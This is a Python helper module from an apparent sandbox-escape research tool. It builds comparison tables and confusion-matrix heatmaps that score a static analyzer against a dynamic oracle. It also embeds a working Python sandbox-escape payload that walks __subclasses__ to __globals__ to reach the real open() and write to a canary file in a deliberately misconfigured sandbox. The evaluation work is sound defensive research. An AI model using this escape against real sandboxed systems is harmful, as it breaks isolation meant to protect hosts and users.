"""Helpers that turn experiment runs into pinned, reviewable artifacts.

Used by ``scripts/reproduce.py``: per-configuration comparison tables, the
confusion-matrix heatmap, and the canary before/after diff.
"""

from __future__ import annotations

import difflib
from collections import defaultdict
from pathlib import Path
from typing import Any, Callable

from sandbox_escape_finder.config import SandboxConfig
from sandbox_escape_finder.dynamic_prober import DynamicProber
from sandbox_escape_finder.oracle import EscapeOracle, capture_canary_state, oracle
from sandbox_escape_finder.payloads import PAYLOADS
from sandbox_escape_finder.reporting import (
    CATEGORIES,
    FALSE_NEGATIVE,
    FALSE_POSITIVE,
    TRUE_NEGATIVE,
    TRUE_POSITIVE,
    build_comparison_table,
    classify_row,
)
from sandbox_escape_finder.static_analyzer import StaticAnalyzer

# Same payload as examples/demo_canary_escape.py (exposed-getattr variant).
_ESCAPE_PAYLOAD = (
    "object_type = getattr(int, '__base__')\n"
    "classes = getattr(object_type, '__subclasses__')()\n"
    "wrap_close = [c for c in classes if 'wrap_close' in str(c)][0]\n"
    "real_globals = getattr(getattr(wrap_close, '__init__'), '__globals__')\n"
    "real_globals['__builtins__']['open'](r'{canary}', 'w').write('PWNED_VIA_EXPOSED_GETATTR')\n"
)


def run_corpus(sandbox_fn: Callable[..., Any] | None, config: SandboxConfig | None = None) -> list[dict[str, Any]]:
    """Static scan + dynamic probe of the full corpus; return the comparison table."""
    config = config or SandboxConfig(timeout_seconds=3.0)
    analyzer = StaticAnalyzer(config=config)
    findings = {p["id"]: analyzer.scan(p["code"]) for p in PAYLOADS}
    prober = DynamicProber(sandbox_fn, oracle, config) if sandbox_fn else DynamicProber(config=config)
    return build_comparison_table(findings, prober.run(PAYLOADS))


def confusion_by_technique(table: list[dict[str, Any]]) -> dict[str, dict[str, int]]:
    counts: dict[str, dict[str, int]] = defaultdict(lambda: {c: 0 for c in CATEGORIES})
    for row in table:
        counts[row["technique"]][classify_row(row)] += 1
    return dict(counts)


def save_confusion_png(tables: dict[str, list[dict[str, Any]]], path: str | Path) -> Path:
    """One heatmap per configuration: technique rows x {TP, FP, FN, TN} columns."""
    import matplotlib

    matplotlib.use("Agg")
    import matplotlib.pyplot as plt

    techniques = sorted({r["technique"] for t in tables.values() for r in t})
    cols = [TRUE_POSITIVE, FALSE_POSITIVE, FALSE_NEGATIVE, TRUE_NEGATIVE]
    labels = ["TP", "FP", "FN", "TN"]
    fig, axes = plt.subplots(
        1, len(tables), figsize=(4.6 * len(tables) + 3.2, 0.55 * len(techniques) + 2.4), sharey=True
    )
    axes = [axes] if len(tables) == 1 else list(axes)
    for ax, (name, table) in zip(axes, tables.items()):
        counts = confusion_by_technique(table)
        grid = [[counts.get(t, {}).get(c, 0) for c in cols] for t in techniques]
        ax.imshow(grid, cmap="Blues", vmin=0, vmax=max(1, max(map(max, grid))))
        ax.set_xticks(range(4), labels)
        ax.set_yticks(range(len(techniques)), techniques)
        ax.set_title(name, fontsize=11)
        for i, row in enumerate(grid):
            for j, v in enumerate(row):
                alarming = labels[j] in ("FP", "FN") and v
                ax.text(
                    j, i, v, ha="center", va="center", fontsize=11,
                    color="white" if v >= 3 else "black",
                    fontweight="bold" if alarming else "normal",
                )
    fig.suptitle("Static analyzer vs. dynamic oracle: confusion counts per technique", fontsize=12)
    fig.tight_layout()
    out = Path(path)
    fig.savefig(out, dpi=160)
    plt.close(fig)
    return out


def canary_demo_diff() -> str:
    """Run the escape payload against the exposed-getattr variant; return a diff of the canary."""
    from sandbox_escape_finder.misconfigured_sandboxes import sandbox_exec_exposed_getattr_builtin

    with EscapeOracle() as fixture:
        path = fixture.canary_path
        before = path.read_text(encoding="utf-8")
        pre = capture_canary_state(path)
        code = _ESCAPE_PAYLOAD.replace("{canary}", str(path).replace("\\", "/"))
        result = sandbox_exec_exposed_getattr_builtin(code, timeout=3.0, work_dir=path.parent)
        verdict = oracle(pre, result, capture_canary_state(path))
        after = path.read_text(encoding="utf-8")
    nl = "\n"
    diff = "".join(
        difflib.unified_diff(
            (before + nl).splitlines(True), (after + nl).splitlines(True), "canary (before)", "canary (after)"
        )
    )
    return f"oracle_escape_verdict: {verdict}\nconfig: exposed_getattr_builtin\n\n{diff or '(no change)'}\n"
